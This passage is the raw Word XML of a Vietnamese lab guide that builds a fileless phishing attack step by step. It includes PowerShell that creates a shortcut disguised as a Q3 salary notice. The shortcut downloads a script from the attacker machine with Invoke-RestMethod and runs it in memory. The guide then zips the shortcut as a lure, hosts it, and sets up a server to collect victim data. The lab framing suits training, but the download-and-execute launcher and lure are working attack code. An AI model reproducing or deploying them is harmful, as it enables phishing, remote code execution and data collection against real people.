          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">File </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> chỉ tồn tại trên attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên victim, nội dung payload được nhận qua HTTP và giữ trong memory.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload không lấy password, cookie, token, clipboard, browser data hoặc tài liệu cá nhân.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không tạo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không tạo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.3. Kiểm tra cú pháp payload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload silent không in kết quả ra màn hình victim. Trên attacker chỉ cần kiểm tra cú pháp trước khi đưa vào ZIP/LNK:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>powershell -NoProfile -Command "$code = Get-Content -Raw .\payload.ps1; [scriptblock]::Create($code) | Out-Null; 'payload parse ok'"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Phải thấy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload parse ok</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Tạo launcher LNK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.1. Logic của launcher</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Victim sẽ không tự gõ PowerShell. Shortcut </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> sẽ gọi PowerShell và thực hiện logic:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$x = Invoke-RestMethod 'http://192.168.141.1:8000/payload.ps1'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$sb = [ScriptBlock]::Create([string]$x)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&amp; $sb</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ở đây không có:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>-OutFile</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>C:\Temp\payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Biến </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>$x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> và </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>$sb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> chỉ tồn tại trong memory của process PowerShell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.2. Tạo create_lnk.ps1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên attacker tạo file:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>C:\Fileless-Lab\create_lnk.ps1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nội dung:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$lnkPath = "C:\Fileless-Lab\ThongBaoLuong_Q3.lnk"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>if (Test-Path -LiteralPath $lnkPath) {</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Remove-Item -LiteralPath $lnkPath -Force</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$Shell = New-Object -ComObject WScript.Shell</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$Shortcut = $Shell.CreateShortcut($lnkPath)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$Shortcut.TargetPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$Shortcut.Arguments = '-NoProfile -Command "$x = Invoke-RestMethod ''http://192.168.141.1:8000/payload.ps1''; $sb = [ScriptBlock]::Create([string]$x); &amp; $sb"'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$Shortcut.WorkingDirectory = ""</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$Shortcut.WindowStyle = 1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$Shortcut.Save()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chạy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cd C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>PowerShell -File .\create_lnk.ps1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kiểm tra:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dir *.lnk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Phải thấy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Tạo ZIP giả lập social engineering</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Trong thư mục </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>, chạy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Compress-Archive -LiteralPath "C:\Fileless-Lab\ThongBaoLuong_Q3.lnk" -DestinationPath "C:\Fileless-Lab\ThongBaoLuong_Q3.zip" -Force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kiểm tra:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dir C:\Fileless-Lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Phải có:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>create_lnk.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8. Khởi động server trên attacker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Mở hai cửa sổ PowerShell trên attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Terminal 1 - host ZIP và payload:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cd C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>python -m http.server 8000 --bind 192.168.141.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kết quả mong đợi:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Serving HTTP on 192.168.141.1 port 8000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Terminal 2 - nhận profile JSON:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cd C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>python .\collect_server.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kết quả mong đợi:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Collecting lab results under C:\Fileless-Lab\collections</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Collector endpoint: http://192.168.141.1:8001/collect</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /collect will be saved under collections/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Giữ cả hai cửa sổ này mở trong lúc chạy kịch bản online.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. Kiểm tra web server từ victim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên victim mở trình duyệt:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://192.168.141.1:8000/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Phải thấy ít nhất:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ở bước này không cần tải </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>. Mục đích chỉ là kiểm tra victim có truy cập được web server của attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10. Thực hiện lab trên victim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bước 1: Victim truy cập:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://192.168.141.1:8000/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bước 2: Download:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bước 3: Extract ZIP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
